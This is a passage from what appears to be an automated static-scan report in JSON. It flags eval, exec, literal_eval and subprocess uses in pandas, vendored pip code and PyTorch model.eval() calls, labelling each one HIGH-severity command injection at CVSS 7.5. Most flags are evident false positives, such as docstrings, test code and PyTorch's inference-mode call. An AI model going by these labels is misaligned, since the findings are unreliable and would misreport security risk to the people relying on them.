            "evidence": "pd.eval(\"x + y\", local_dict={\"x\": 1, \"y\": 2}, parser=\"asdf\")",
            "context": "def test_invalid_parser():\n    msg = \"Invalid parser 'asdf' passed\"\n    with pytest.raises(KeyError, match=msg):\n        pd.eval(\"x + y\", local_dict={\"x\": 1, \"y\": 2}, parser=\"asdf\")\n\n\n_parsers: dict[str, type[BaseExprVisitor]] = {",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1826,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(e, engine=engine, parser=parser)",
            "context": "def test_syntax_error_exprs(engine, parser):\n    e = \"s +\"\n    with pytest.raises(SyntaxError, match=\"invalid syntax\"):\n        pd.eval(e, engine=engine, parser=parser)\n\n\ndef test_name_error_exprs(engine, parser):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1833,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(e, engine=engine, parser=parser)",
            "context": "    e = \"s + t\"\n    msg = \"name 's' is not defined\"\n    with pytest.raises(NameError, match=msg):\n        pd.eval(e, engine=engine, parser=parser)\n\n\n@pytest.mark.parametrize(\"express\", [\"a + @b\", \"@a + b\", \"@a + @b\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1842,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(express, engine=engine, parser=parser)",
            "context": "\n    if parser != \"pandas\":\n        with pytest.raises(SyntaxError, match=\"The '@' prefix is only\"):\n            pd.eval(express, engine=engine, parser=parser)\n    else:\n        with pytest.raises(SyntaxError, match=\"The '@' prefix is not\"):\n            pd.eval(express, engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1845,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(express, engine=engine, parser=parser)",
            "context": "            pd.eval(express, engine=engine, parser=parser)\n    else:\n        with pytest.raises(SyntaxError, match=\"The '@' prefix is not\"):\n            pd.eval(express, engine=engine, parser=parser)\n\n\ndef test_numexpr_builtin_raises(engine, parser):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1853,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"sin + dotted_line\", engine=engine, parser=parser)",
            "context": "    if engine == \"numexpr\":\n        msg = \"Variables in expression .+\"\n        with pytest.raises(NumExprClobberingError, match=msg):\n            pd.eval(\"sin + dotted_line\", engine=engine, parser=parser)\n    else:\n        res = pd.eval(\"sin + dotted_line\", engine=engine, parser=parser)\n        assert res == sin + dotted_line",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1855,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"sin + dotted_line\", engine=engine, parser=parser)",
            "context": "        with pytest.raises(NumExprClobberingError, match=msg):\n            pd.eval(\"sin + dotted_line\", engine=engine, parser=parser)\n    else:\n        res = pd.eval(\"sin + dotted_line\", engine=engine, parser=parser)\n        assert res == sin + dotted_line\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1862,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"1 + 2\", resolvers=cannot_resolve, engine=engine, parser=parser)",
            "context": "def test_bad_resolver_raises(engine, parser):\n    cannot_resolve = 42, 3.0\n    with pytest.raises(TypeError, match=\"Resolver of type .+\"):\n        pd.eval(\"1 + 2\", resolvers=cannot_resolve, engine=engine, parser=parser)\n\n\ndef test_empty_string_raises(engine, parser):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1868,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"\", engine=engine, parser=parser)",
            "context": "def test_empty_string_raises(engine, parser):\n    # GH 13139\n    with pytest.raises(ValueError, match=\"expr cannot be an empty string\"):\n        pd.eval(\"\", engine=engine, parser=parser)\n\n\ndef test_more_than_one_expression_raises(engine, parser):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1873,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"1 + 1; 2 + 2\", engine=engine, parser=parser)",
            "context": "\ndef test_more_than_one_expression_raises(engine, parser):\n    with pytest.raises(SyntaxError, match=\"only a single expression is allowed\"):\n        pd.eval(\"1 + 1; 2 + 2\", engine=engine, parser=parser)\n\n\n@pytest.mark.parametrize(\"cmp\", (\"and\", \"or\"))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1895,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(ex, engine=engine, parser=parser)",
            "context": "    for ex in (ex1, ex2, ex3):\n        msg = \"cannot evaluate scalar only bool ops|'BoolOp' nodes are not\"\n        with pytest.raises(NotImplementedError, match=msg):\n            pd.eval(ex, engine=engine, parser=parser)\n\n\n@pytest.mark.parametrize(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1907,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(f\"A == {other}\")",
            "context": ")\ndef test_equals_various(other):\n    df = DataFrame({\"A\": [\"a\", \"b\", \"c\"]}, dtype=object)\n    result = df.eval(f\"A == {other}\")\n    expected = Series([False, False, False], name=\"A\")\n    if USE_NUMEXPR:\n        # https://github.com/pandas-dev/pandas/issues/10239",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1919,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(s, engine=engine, parser=parser)",
            "context": "def test_inf(engine, parser):\n    s = \"inf + 1\"\n    expected = np.inf\n    result = pd.eval(s, engine=engine, parser=parser)\n    assert result == expected\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1983,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"A = B + C\", inplace=True)",
            "context": "    result_view = df[:]\n    ser = df[\"A\"]\n    with tm.assert_cow_warning(warn_copy_on_write):\n        df.eval(\"A = B + C\", inplace=True)\n    expected = DataFrame({\"A\": [11, 13, 15], \"B\": [4, 5, 6], \"C\": [7, 8, 9]})\n    tm.assert_frame_equal(df, expected)\n    if not using_copy_on_write:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 2000,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"2+2\", inplace=value)",
            "context": "    def test_validate_bool_args(self, value):\n        msg = 'For argument \"inplace\" expected type bool, received type'\n        with pytest.raises(ValueError, match=msg):\n            pd.eval(\"2+2\", inplace=value)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/multi/test_formats.py",
            "line": 64,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval(repr(mi))",
            "context": "    mi = MultiIndex.from_product([list(\"ab\"), range(3)], names=[\"first\", \"second\"])\n    msg = \"Must pass both levels and codes\"\n    with pytest.raises(TypeError, match=msg):\n        eval(repr(mi))\n\n\ndef test_unicode_string_with_unicode():",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/numeric/test_numeric.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tm.assert_index_equal(eval(repr(index)), index, exact=True)",
            "context": "        return Index([0.0, 2.5, 5.0, 7.5, 10.0], dtype=dtype)\n\n    def test_repr_roundtrip(self, index):\n        tm.assert_index_equal(eval(repr(index)), index, exact=True)\n\n    def check_coerce(self, a, b, is_float_index=True):\n        assert a.equals(b)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/ranges/test_range.py",
            "line": 63,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = eval(result)",
            "context": "        expected = \"RangeIndex(start=0, stop=5, step=1, name='Foo')\"\n        assert result == expected\n\n        result = eval(result)\n        tm.assert_index_equal(result, i, exact=True)\n\n        i = RangeIndex(5, 0, -1)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/ranges/test_range.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = eval(result)",
            "context": "        expected = \"RangeIndex(start=5, stop=0, step=-1)\"\n        assert result == expected\n\n        result = eval(result)\n        tm.assert_index_equal(result, i, exact=True)\n\n    def test_insert(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/ranges/test_range.py",
            "line": 398,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tm.assert_index_equal(eval(repr(index)), index)",
            "context": "\n    def test_repr_roundtrip(self, simple_index):\n        index = simple_index\n        tm.assert_index_equal(eval(repr(index)), index)\n\n    def test_slice_keep_name(self):\n        idx = RangeIndex(1, 2, name=\"asdf\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/base_class/test_formats.py",
            "line": 16,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = eval(repr(idx))",
            "context": "        # for the case of Index, where the repr is traditional rather than\n        # stylized\n        idx = Index([\"a\", \"b\"])\n        res = eval(repr(idx))\n        tm.assert_index_equal(res, idx)\n\n    @pytest.mark.xfail(using_string_dtype(), reason=\"repr different\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/categorical/test_category.py",
            "line": 203,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tm.assert_index_equal(eval(repr(ci)), ci, exact=True)",
            "context": "    def test_repr_roundtrip(self):\n        ci = CategoricalIndex([\"a\", \"b\"], categories=[\"a\", \"b\"], ordered=True)\n        str(ci)\n        tm.assert_index_equal(eval(repr(ci)), ci, exact=True)\n\n        # formatting\n        str(ci)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/xml/test_to_xml.py",
            "line": 1105,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_incorrect_xsl_eval(geom_df):",
            "context": "        geom_df.to_xml(stylesheet=xsl)\n\n\ndef test_incorrect_xsl_eval(geom_df):\n    lxml_etree = pytest.importorskip(\"lxml.etree\")\n\n    xsl = \"\"\"\\",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/xml/test_xml.py",
            "line": 1272,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_incorrect_xsl_eval(kml_cta_rail_lines):",
            "context": "        read_xml(kml_cta_rail_lines, stylesheet=xsl)\n\n\ndef test_incorrect_xsl_eval(kml_cta_rail_lines):\n    lxml_etree = pytest.importorskip(\"lxml.etree\")\n\n    xsl = \"\"\"\\",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/methods/test_sample.py",
            "line": 176,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = obj.sample(n=3, random_state=eval(func_str)(arg))",
            "context": "        # GH#32503\n        obj = DataFrame({\"col1\": range(10, 20), \"col2\": range(20, 30)})\n        obj = tm.get_obj(obj, frame_or_series)\n        result = obj.sample(n=3, random_state=eval(func_str)(arg))\n        expected = obj.sample(n=3, random_state=com.random_state(eval(func_str)(arg)))\n        tm.assert_equal(result, expected)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/methods/test_sample.py",
            "line": 177,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "expected = obj.sample(n=3, random_state=com.random_state(eval(func_str)(arg)))",
            "context": "        obj = DataFrame({\"col1\": range(10, 20), \"col2\": range(20, 30)})\n        obj = tm.get_obj(obj, frame_or_series)\n        result = obj.sample(n=3, random_state=eval(func_str)(arg))\n        expected = obj.sample(n=3, random_state=com.random_state(eval(func_str)(arg)))\n        tm.assert_equal(result, expected)\n\n    def test_sample_generator(self, frame_or_series):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/scalar/timestamp/test_formats.py",
            "line": 110,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert date_only == eval(repr(date_only))",
            "context": "        assert date in repr(date_only)\n        assert tz_repr not in repr(date_only)\n        assert freq_repr not in repr(date_only)\n        assert date_only == eval(repr(date_only))\n\n        date_tz = Timestamp(date, tz=tz)\n        assert date in repr(date_tz)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/scalar/timestamp/test_formats.py",
            "line": 116,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert date_tz == eval(repr(date_tz))",
            "context": "        assert date in repr(date_tz)\n        assert tz_repr in repr(date_tz)\n        assert freq_repr not in repr(date_tz)\n        assert date_tz == eval(repr(date_tz))\n\n    def test_repr_utcoffset(self):\n        # This can cause the tz field to be populated, but it's redundant to",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/scalar/timestamp/test_formats.py",
            "line": 126,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert date_with_utc_offset == eval(expr)",
            "context": "        assert \"tzoffset\" not in repr(date_with_utc_offset)\n        assert \"UTC-04:00\" in repr(date_with_utc_offset)\n        expr = repr(date_with_utc_offset)\n        assert date_with_utc_offset == eval(expr)\n\n    def test_timestamp_repr_pre1900(self):\n        # pre-1900",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/scalar/timestamp/test_formats.py",
            "line": 163,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert eval(repr(z)) == z",
            "context": "            Timestamp(\"2001-04-17 00:00:00\", tz=None),\n        ]\n        for z in zs:\n            assert eval(repr(z)) == z\n\n    def test_repr_matches_pydatetime_no_tz(self):\n        dt_date = datetime(2013, 1, 2)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/scalar/timestamp/test_constructors.py",
            "line": 652,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert result == eval(repr(result))",
            "context": "        assert result._value == Timestamp(\"2013-11-01 05:00\")._value\n        expected = \"Timestamp('2013-11-01 00:00:00-0500', tz='America/Chicago')\"\n        assert repr(result) == expected\n        assert result == eval(repr(result))\n\n        # This should be 2013-11-01 05:00 in UTC\n        # converted to Tokyo tz (+09:00)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/scalar/timestamp/test_constructors.py",
            "line": 660,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert result == eval(repr(result))",
            "context": "        assert result._value == Timestamp(\"2013-11-01 05:00\")._value\n        expected = \"Timestamp('2013-11-01 14:00:00+0900', tz='Asia/Tokyo')\"\n        assert repr(result) == expected\n        assert result == eval(repr(result))\n\n        # GH11708\n        # This should be 2015-11-18 10:00 in UTC",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/scalar/timestamp/test_constructors.py",
            "line": 669,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert result == eval(repr(result))",
            "context": "        assert result._value == Timestamp(\"2015-11-18 10:00\")._value\n        expected = \"Timestamp('2015-11-18 15:45:00+0545', tz='Asia/Katmandu')\"\n        assert repr(result) == expected\n        assert result == eval(repr(result))\n\n        # This should be 2015-11-18 10:00 in UTC\n        # converted to Asia/Kolkata",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/scalar/timestamp/test_constructors.py",
            "line": 677,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert result == eval(repr(result))",
            "context": "        assert result._value == Timestamp(\"2015-11-18 10:00\")._value\n        expected = \"Timestamp('2015-11-18 15:30:00+0530', tz='Asia/Kolkata')\"\n        assert repr(result) == expected\n        assert result == eval(repr(result))\n\n    def test_constructor_invalid(self):\n        msg = \"Cannot convert input\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/scope.py",
            "line": 199,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "``DataFrame.eval()`` and ``DataFrame.query()``.",
            "context": "        Return whether we have any extra scope.\n\n        For example, DataFrames pass Their columns as resolvers during calls to\n        ``DataFrame.eval()`` and ``DataFrame.query()``.\n\n        Returns\n        -------",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/eval.py",
            "line": 173,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(",
            "context": "                raise SyntaxError(msg)\n\n\ndef eval(\n    expr: str | BinOp,  # we leave BinOp out of the docstr bc it isn't for users\n    parser: str = \"pandas\",\n    engine: str | None = None,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/eval.py",
            "line": 297,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> pd.eval(\"double_age = df.age * 2\", target=df)",
            "context": "\n    We can add a new column using ``pd.eval``:\n\n    >>> pd.eval(\"double_age = df.age * 2\", target=df)\n      animal  age  double_age\n    0    dog   10          20\n    1    pig   20          40",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/expr.py",
            "line": 482,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _maybe_eval(self, binop, eval_in_python):",
            "context": "\n        return left, right\n\n    def _maybe_eval(self, binop, eval_in_python):\n        # eval `in` and `not in` (for now) in \"partial\" python space\n        # things that can be evaluated in \"eval\" space will be turned into\n        # temporary variables. for example,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/expr.py",
            "line": 517,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return self._maybe_eval(res, self.binary_ops)",
            "context": "        ):\n            # all date ops must be done in python bc numexpr doesn't work\n            # well with NaT\n            return self._maybe_eval(res, self.binary_ops)\n\n        if res.op in eval_in_python:\n            # \"in\"/\"not in\" ops are always evaluated in python",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/expr.py",
            "line": 521,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return self._maybe_eval(res, eval_in_python)",
            "context": "\n        if res.op in eval_in_python:\n            # \"in\"/\"not in\" ops are always evaluated in python\n            return self._maybe_eval(res, eval_in_python)\n        elif self.engine != \"pytables\":\n            if (\n                getattr(lhs, \"return_type\", None) == object",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/expr.py",
            "line": 531,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return self._maybe_eval(res, eval_in_python + maybe_eval_in_python)",
            "context": "            ):\n                # evaluate \"==\" and \"!=\" in python if either of our operands\n                # has an object or string return type\n                return self._maybe_eval(res, eval_in_python + maybe_eval_in_python)\n        return res\n\n    def visit_BinOp(self, node, **kwargs):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/expr.py",
            "line": 578,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd_eval(",
            "context": "\n        value = self.visit(node.value)\n        slobj = self.visit(node.slice)\n        result = pd_eval(\n            slobj, local_dict=self.env, engine=self.engine, parser=self.parser\n        )\n        try:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/expr.py",
            "line": 586,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "lhs = pd_eval(",
            "context": "            v = value.value[result]\n        except AttributeError:\n            # an Op instance\n            lhs = pd_eval(\n                value, local_dict=self.env, engine=self.engine, parser=self.parser\n            )\n            v = lhs[result]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/ops.py",
            "line": 431,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = eval(self, local_dict=env, engine=engine, parser=parser)",
            "context": "            else:\n                from pandas.core.computation.eval import eval\n\n                res = eval(self, local_dict=env, engine=engine, parser=parser)\n\n        name = env.add_tmp(res)\n        return term_type(name, env=env)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/mcp_learning/algorithms.py",
            "line": 200,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.model.eval()",
            "context": "            data = self.pca.transform(data)\n        \n        # Predict\n        self.model.eval()\n        with torch.no_grad():\n            x = torch.FloatTensor(data)\n            predictions = self.model(x).numpy()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/mcp_learning/learning.py",
            "line": 137,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.model.eval()",
            "context": "            padded[0, i, :len(seq)] = seq\n            \n        # Predict\n        self.model.eval()\n        with torch.no_grad():\n            input_tensor = torch.from_numpy(padded)\n            output, _ = self.model(input_tensor)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
            "line": 735,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\"\"\"def reraise(tp, value, tb=None):\n    try:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/utils/setuptools_build.py",
            "line": 10,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(compile('''",
            "context": "# Windows are correctly handled (it should be \"C:\\\\Users\" not \"C:\\Users\").\n_SETUPTOOLS_SHIM = textwrap.dedent(\n    \"\"\"\n    exec(compile('''\n    # This is <pip-setuptools-caller> -- a caller that pip uses to run setup.py\n    #\n    # - It imports setuptools before invoking setup.py, to enable projects that directly",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/utils/setuptools_build.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(compile(setup_py_code, filename, \"exec\"))",
            "context": "        filename = \"<auto-generated setuptools caller>\"\n        setup_py_code = \"from setuptools import setup; setup()\"\n\n    exec(compile(setup_py_code, filename, \"exec\"))\n    ''' % ({!r},), \"<pip-setuptools-caller>\", \"exec\"))\n    \"\"\"\n).rstrip()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/commands/configuration.py",
            "line": 239,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "subprocess.check_call(f'{editor} \"{fname}\"', shell=True)",
            "context": "            )\n\n        try:\n            subprocess.check_call(f'{editor} \"{fname}\"', shell=True)\n        except FileNotFoundError as e:\n            if not e.filename:\n                e.filename = editor",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/results.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "print(f\"{s} -> {fn(eval(s))}\")",
            "context": "        result = date_str.parse_string(\"1999/12/31\")\n\n        def test(s, fn=repr):\n            print(f\"{s} -> {fn(eval(s))}\")\n        test(\"list(result)\")\n        test(\"result[0]\")\n        test(\"result['month']\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1561,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, namespace, namespace)",
            "context": "            with open(script_filename) as fid:\n                source = fid.read()\n            code = compile(source, script_filename, 'exec')\n            exec(code, namespace, namespace)\n        else:\n            from linecache import cache\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1572,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(script_code, namespace, namespace)",
            "context": "                script_filename,\n            )\n            script_code = compile(script_text, script_filename, 'exec')\n            exec(script_code, namespace, namespace)\n\n    def _has(self, path):\n        raise NotImplementedError(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/markup.py",
            "line": 184,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "meta_params = literal_eval(parameters)",
            "context": "                            )\n\n                        try:\n                            meta_params = literal_eval(parameters)\n                        except SyntaxError as error:\n                            raise MarkupError(\n                                f\"error parsing {parameters!r} in {open_tag.parameters!r}; {error.msg}\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
            "line": 787,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec (\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec (\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\n        \"\"\"def reraise(tp, value, tb=None):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/formatters/__init__.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "this method is equivalent to running ``eval()`` on the input file. The formatter is",
